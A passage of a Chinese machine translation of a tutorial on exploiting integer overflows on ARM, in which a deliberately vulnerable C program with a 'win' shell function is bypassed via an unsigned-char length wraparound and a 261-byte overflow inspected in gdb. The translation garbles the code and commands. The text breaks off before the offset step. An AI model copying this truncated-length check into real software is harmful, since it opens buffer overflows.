<html>
<head>
<title>Integer Overflows in ARM</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ARM中的整数溢出</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/integer-overflows-in-arm-b4e650d072d4?source=collection_archive---------0-----------------------#2021-08-07">https://infosecwriteups.com/integer-overflows-in-arm-b4e650d072d4?source=collection_archive---------0-----------------------#2021-08-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="cdc0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好黑客们，</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="kq kr l"/></div></figure><p id="a571" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天我们将探讨ARM中的整数溢出。相信我，这不会像ROP链一样长。在深入这个主题之前，请确保您对利用ARM中简单的基于堆栈的溢出有一些基础知识。如果你对ARM ROP链感兴趣，我建议你看看这篇文章。</p><blockquote class="ks kt ku"><p id="b95c" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"><a class="ae kz" href="https://medium.com/@ad2001/rop-chains-on-arm-3f087a95381e" rel="noopener">https://medium.com/@ad2001/rop-chains-on-arm-3f087a95381e</a></p></blockquote><p id="d06e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">废话说够了，让我们进入正题。</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="la kr l"/></div></figure><h1 id="9496" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated"><strong class="ak">整数溢出简介</strong></h1><p id="59de" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">那么什么是整数溢出呢？？</p><p id="ab2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们熟悉溢出，但是什么是整数溢出呢？有什么想法吗？？</p><p id="1019" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简单地说，这是一种算术溢出，当整数运算的结果不适合分配的内存空间时就会发生。整数溢出本身不会引起太多关注，但它会导致其他漏洞，如缓冲区溢出，这会导致严重的安全问题。我认为这是足够的介绍，让我们转到实际的东西</p><p id="25a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您想了解更多关于此漏洞及其影响的信息。浏览这些链接</p><blockquote class="ks kt ku"><p id="6b69" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"><a class="ae kz" href="https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/" rel="noopener ugc nofollow" target="_blank">https://www . acune tix . com/blog/we B- security-zone/what-is-integer-overflow/</a></p><p id="3694" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"><a class="ae kz" href="https://www.securecoding.com/blog/integer-overflow-attack-and-prevention/" rel="noopener ugc nofollow" target="_blank">https://www . secure coding . com/blog/integer-overflow-attack-and-prevention/</a></p></blockquote><p id="1cf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了深入理解这个漏洞，我们需要用c数据类型来刷新我们的记忆。所以让我们快速进入这个话题。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div class="gh gi me"><img src="../Images/413c2791a7f8c1185a470627533757e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1278/format:webp/0*495_6DijShsQK-aQ.jpg"/></div><figcaption class="mh mi gj gh gi mj mk bd b be z dk translated"><a class="ae kz" href="https://sillycodes.com/different-datatypes-in-c-with-format/" rel="noopener ugc nofollow" target="_blank">https://silly codes . com/different-data types-in-c-with-format/</a></figcaption></figure><p id="ed35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在看一下范围列。如果您不知道该列描述的是什么，它显示了可以包含在该数据类型中的值的范围。</p><p id="43c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">有符号类型</strong>可以包含正值和负值，但<strong class="jp ir">无符号类型</strong>只能包含正值。</p><p id="e436" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">举个例子，</p><p id="e694" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你看一下<strong class="jp ir">无符号短整型</strong>，它只能保存正值，范围是0到65535。所以它能容纳的最小值是0，最大值是65535。</p><p id="458b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么当我们增加一个大于65535的值时，你认为会发生什么？</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="ml kr l"/></div></figure><p id="70b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们先看一个最大范围值的例子。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mm"><img src="../Images/2311290410e1f17cf23326b81fa0c000.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*B6f2TC9Ja-Xvn68N7Xe-jw.png"/></div></div></figure><p id="a5f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">分析这个程序，我们可以看到这个变量是一个短整型变量，它的值是65535，这是一个短整型变量所能容纳的最大值。正如所料，程序的输出是65535。</p><p id="9baa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们给这个值加1，结果是65536，这个值在短整型的范围之外。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mr"><img src="../Images/c0fe5d9b216cc55e9dbde395d94a862b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ls0Brcrsg-H859EcGeekgQ.png"/></div></div></figure><p id="e5c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哇！！刚刚发生了什么？我们知道变量的值是65536，但是程序的结果显示为零</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="ms kr l"/></div></figure><p id="d6d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你再加一个，就会得到一个。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mt"><img src="../Images/14855a29bd06a1eff16da9f6b78f3bee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dubqYHKgdvpFo7uUZrHvjg.png"/></div></div></figure><p id="56cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里到底发生了什么？</p><p id="d93c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了更好地理解这个概念，我们可以使用计算器，所以打开你选择的计算器，我将使用我的windows计算器。</p><p id="6fc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">无符号短整型的大小是2字节，准确的说是16位。我们的短整型的最大范围是65535。如果您在计算器的十进制字段中键入该值，它将是1111 1111 1111 1111 1111，这是16位的二进制数。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/22f0bc4868710dbde43c111495d28fc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1138/format:webp/1*8ZzIl53UZX8xO4bGmkVVfA.png"/></div></figure><p id="cc1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们增加一个，会发生什么？让我们试试那个</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/23b3ae1b9f457ec6b951be290ab1372c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1264/format:webp/1*vOHVCSfO8TEou8w-3Bh1Xw.png"/></div></figure><p id="e4da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当然，这个值将是65536，因为这是我们的计算器。但是如果我们用一个无符号的短整型把它编译成一个c程序，它就会是零。</p><p id="29d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你仔细观察我突出显示的二进制数，右边的16位都是零。并且在二进制字段中显示了额外的4位。因此，值0001 0000 0000 0000 0000用于表示值65536，其大小不再是2字节(16位)。如果这是一个c程序，就像之前的无符号短整型一样，那么右边的16位将用于表示值，结果将是零，因为右边的16位二进制数表示零(十进制数也是零)。</p><p id="edb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们给它加一个，看看会发生什么。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/b6ac7f36fd69050c3283916aa51b39dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/format:webp/1*ajMw1ShtdVUmpNL2bvqyPA.png"/></div></figure><p id="3541" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该值变为65537。但如果仔细观察二进制字段右侧的后16位，它显示为0000 0000 0000 0001(忽略前4位)，表示十进制的1。这与我们在程序中给65535加2时得到的值相同。</p><p id="83b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简单总结一下，当我们输入一个大于65535的值(这是无符号short int的最大范围，大小为2字节)时，它将溢出，就像我们在计算器的二进制字段中看到的那样，并绕回零(从右数的最后16位)。结果，该值变为零。</p><p id="57e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们来看一个剥削的程序。</p><h1 id="b7e3" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">剥削</h1><p id="a48f" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">请查看下面这个易受攻击的程序。</p><blockquote class="ks kt ku"><p id="54cc" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"># include<stdio.h><br/># include&lt;string . h&gt;<br/># include&lt;stdlib . h&gt;</stdio.h></p><p id="f588" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">void check(char * password)；<br/> void win() <br/> { <br/> printf("恭喜你赢了你得到了一个贝壳:)\ n \ n ")；<br/>系统("/bin/sh ")；<br/> }</p><p id="84b2" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">int main(int argc，char* argv[]) {</p><p id="c4bc" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">如果(argc！=2) { <br/> printf("给我一个参数\ n ")；<br/>退出(0)；</p><p id="68e3" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi">}</p><p id="b328" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">check(argv[1])；<br/>返回0；</p><p id="b981" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi">}</p><p id="fd5f" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">void check(char* password) {</p><p id="df22" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">printf(" Welcome…尝试获取shell \ n ")；<br/>字符缓冲区【10】；<br/>int user _ win = 0；<br/>无符号字符长度= strlen(密码)；//漏洞<br/> printf("您输入的长度是:%d \n "，Length)；<br/>如果(长度&gt; = 4 &amp; &amp;长度&lt; = 8)</p><p id="9f10" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">{ <br/> strcpy(缓冲区，密码)；<br/>if(user _ win = = 42424242){<br/>printf(" You won \ n ")；<br/>win()；<br/> }else{ <br/> printf("你输了\ n ")；<br/>}<br/>}<br/>else {<br/>printf("保留4和8之间的数据\ n ")；<br/> } <br/> }</p></blockquote><p id="2c12" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用的是Azeria labs的仿真ARM v6I。你可以从azerialabs.com下载这个虚拟机。</p><blockquote class="ks kt ku"><p id="d1a4" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">gcc整数溢出</p></blockquote><p id="5f59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们检查一下代码，以便有所了解。源代码中有三个函数。“<em class="kv"> main </em>函数是程序开始的地方，我们的程序接受一个命令行输入。</p><p id="6569" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kv">检查</em>有3个变量。</p><blockquote class="ks kt ku"><p id="1d86" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">char缓冲器[10]；<br/>int user _ win = 0；<br/>无符号字符长度= strlen(密码)；</p></blockquote><p id="8559" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">缓冲区最多可以接受10个字符，user_win变量的默认值为0，最后，变量<em class="kv"> "length" </em>的类型为unsigned char，它包含我们的命令行输入的长度。</p><p id="e7a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一个名为win()的函数，它在被调用时为我们提供了一个shell，但只有当user_win的值为42424242时才会被调用。</p><blockquote class="ks kt ku"><p id="8ba4" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">void win() <br/> { <br/> printf("恭喜你赢了你得到了一个shell:)\ n \ n ")；<br/>系统("/bin/sh ")；<br/> }</p></blockquote><p id="1076" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">strcpy函数只在输入长度在4到8个字符之间时将值复制到缓冲区。</p><blockquote class="ks kt ku"><p id="aef0" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">if(长度&gt; = 4 &amp;&amp;长度&lt;= 8)</p><p id="f2d3" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">{<br/> strcpy(缓冲区，密码)；<br/>if(user _ win = = 0x 42424242){<br/>printf(" You won \ n ")；<br/>win()；<br/> }else{ <br/> printf("你输了\ n ")；<br/>}<br/>}<br/>else {<br/>printf("保留4和8之间的数据\ n ")；<br/> }</p></blockquote><p id="6d06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们的目标是什么？？</p><p id="fe4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的……正如你已经猜到的，我们需要调用win函数，这样我们就可以得到shell了。为此，我们需要将user_win的值更改为0x 42424242(“BBBB”)。</p><p id="fde2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们怎么做呢？</p><p id="504c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可能会想到使缓冲区溢出，但是要使缓冲区溢出，我们需要使用strcpy()函数。由于if条件，在这种情况下不能直接利用strcpy()函数。让我们看看这个。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mx"><img src="../Images/835b2acc1948f8fb790cdfbba1fc7fa5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-0ge16R_awPFUKcmZFJ7rg.png"/></div></div></figure><p id="5f57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它显示了我们输入的长度。如您所见，在这种情况下，233大于4，因此，程序显示消息<em class="kv">“保持数据在4和8之间”</em>并退出</p><p id="d4df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您包含4到8个字符的输入，那么程序工作。它将传递if条件，并使用strcpy()函数将输入复制到缓冲区。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi my"><img src="../Images/0c07538df41f116c9a31efc589426eaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-YUJ7LhxEs605HXQxVu0mQ.png"/></div></div></figure><p id="0f92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你现在看，程序会说“<em class="kv">你输了</em>”。如果你不把user_win变量改为0x42424242，程序会一直显示这条消息。</p><p id="4d60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么我们将如何利用这一点呢？</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="mz kr l"/></div></figure><p id="4090" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你看一下<strong class="jp ir">长度变量</strong>，你会发现一些奇怪的东西。它使用一个<strong class="jp ir">无符号字符</strong>来存储我们输入的长度。strlen()获取输入的长度，并将其存储到无符号字符变量“length”中。然后，这个变量用于验证是否发生了溢出</p><p id="65f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，看看上面的范围图。无符号字符的范围是0到255。我们可以使用下面的c程序来确认这一点。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi na"><img src="../Images/10d94f16de15b00a1c9e6133c5817ba7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hXqHddsyyyXeIdHNjO10dQ.png"/></div></div></figure><p id="c0f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再加一个吧。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nb"><img src="../Images/5ed7b5c210214f457bf277c028810b10.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ApgN6mrmYU8f_Amvt1dxkw.png"/></div></div></figure><p id="2cf7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘣！！！现在是零。发生这种情况是因为值溢出并被包装(如上所述)</p><p id="b6d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:你可能会想为什么我要用一个无符号字符来存储输入的长度，这是为了解释的简单。</p><p id="8ac0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们需要将这个漏洞链接到，以便溢出缓冲区，并将user_win变量的值更改为0x42424242，以获得shell。</p><p id="12bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们开始吧</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="la kr l"/></div></figure><p id="9e11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们需要输入255个以上的“A ”,这样存储在无符号字符“length”中的输入长度将会返回到零。让我们试试那个</p><p id="4013" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们需要输入255个以上的“A ”,这样存储在无符号字符“length”中的输入长度将会返回到零。让我们试试，为此，我将使用python</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nc"><img src="../Images/62cb7a834fe6629654d07f30afa39125.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RirBInE4hTVAxC75aG4RtQ.png"/></div></div></figure><p id="3980" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">啊哈…正如程序所显示的，输入的长度现在为零。我们在这里提供的输入字符数是256个“A”。因为这超出了无符号字符的范围(最大范围:255 ),所以它将返回到零。</p><p id="5e6d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将有助于通过我们的if条件。为了绕过“如果条件”,我们需要输入介于4和8之间的值。所以让我们在256 A(261 A)的基础上再加5个字符。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nd"><img src="../Images/7be4795a6b74b1cbc4af76e40ced80e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FhFn7Aiy7ROEty264Xcbww.png"/></div></div></figure><p id="1d17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们的长度是5，我们也绕过了if条件。似乎我们已经触发strcpy将261个字符复制到大小为10字节的缓冲区，并溢出缓冲区。</p><p id="7781" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们用gef来证实这一点。</p><blockquote class="ks kt ku"><p id="3d68" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">pi @ raspberrypi:~/ASM/integer overflow $ gdb。/integer overflow<br/>GNU gdb(Raspbian 7 . 7 . 1+dfsg-5+rpi 1)7 . 7 . 1<br/>Copyright 2014 Free Software Foundation，Inc .<br/>License GPLv3+:GNU GPL version 3或更高版本&lt;<a class="ae kz" href="http://gnu.org/licenses/gpl.html" rel="noopener ugc nofollow" target="_blank">http://gnu.org/licenses/gpl.html</a>&gt;<br/>这是自由软件:你可以自由更改和重新发布它。<br/>在法律允许的范围内，不提供任何担保。键入“显示复印”<br/>和“显示保修”了解详情。<br/>这个GDB被配置为“arm-linux-gnueabihf”。<br/>输入“显示配置”了解配置详情。<br/>关于bug报告的说明，请参见:<br/>&lt;<a class="ae kz" href="http://www.gnu.org/software/gdb/bugs/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/bugs/</a>&gt;。<br/>在<br/>&lt;<a class="ae kz" href="http://www.gnu.org/software/gdb/documentation/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/documentation/</a>&gt;找到GDB手册和其他在线文档资源。如需帮助，请键入“help”。<br/>键入“apropos word”以搜索与“word”相关的命令……<br/>[*]无调试会话活动<br/> GEF for linux就绪，键入“GEF”以启动，键入“gef config”以配置<br/> 56个使用Python引擎2.7为GDB 7.7.1加载的命令<br/> [*] 4个命令无法加载，运行“gef missing”以了解原因。从…读取符号。/integeroverflow…(未找到调试符号)…完成。<br/>GEF&gt;r $(python-c ' print " A " * 261 ')</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ne"><img src="../Images/26779baa9d96af606126e78c244e850a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_3--eiKdheOddsL8eojPTg.png"/></div></div></figure><p id="f5ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">pc也会被覆盖，这就是为什么我们以SIGSEGV结束。</p><p id="47f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要找到user_win变量的位置，这样我们就可以用“BBBB”(42424242)覆盖user_win的值。</p><p id="910d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，再次将文件加载到gdb中，并使用<em class="kv"> disass </em>命令反汇编check函数。</p><blockquote class="ks kt ku"><p id="aa14" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">拆卸检查</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nf"><img src="../Images/3524663905b5d4ba446c706bdc8d135e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*51l5uLNORuXj8PYPTjZ8Yg.png"/></div></div></figure><p id="91de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您仔细观察此时的反汇编，我们可以引用“user_win”变量。</p><p id="e533" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看看我重点提到的<em class="kv"> CMP </em>，它和我们在源代码中看到的“if条件”是一样的。试着在那里放一个断点，用261 A作为输入运行gdb。</p><blockquote class="ks kt ku"><p id="b4b5" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">gef&gt; b *0x00010600 <br/>断点3在0x 10600<br/>GEF&gt;r $(python-c ' print " A " * 261 ')<br/>启动程序:/home/pi/ASM/integer overflow/integer overflow $(python-c ' print " A " * 261 ')<br/>欢迎…尝试获取一个shell <br/>输入的长度是:5</p><p id="63b0" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">check()中的断点3，0x00010600</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ng"><img src="../Images/2c35d352c99dadf98f2da2b127f94cf7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uqzxXKbgbAjS8AhIvjH3ig.png"/></div></div></figure><p id="88f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，r3表示user_win变量，并且当前保存值0x41414141。user_win的默认值已更改，因为缓冲区溢出导致用户输入(261 A)溢出堆栈中的内容，r2包含值0x42424242 (BBBB ),该值将与r3进行比较。这是我们strcpy之后的“if条件”，如果user_win包含0x42424242我们会得到一个shell。</p><p id="c68d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里唯一要做的就是找到覆盖user_win的输入的位置。为此，我们可以使用一种模式。我将使用这个模式发生器</p><div class="nh ni gp gr nj nk"><a 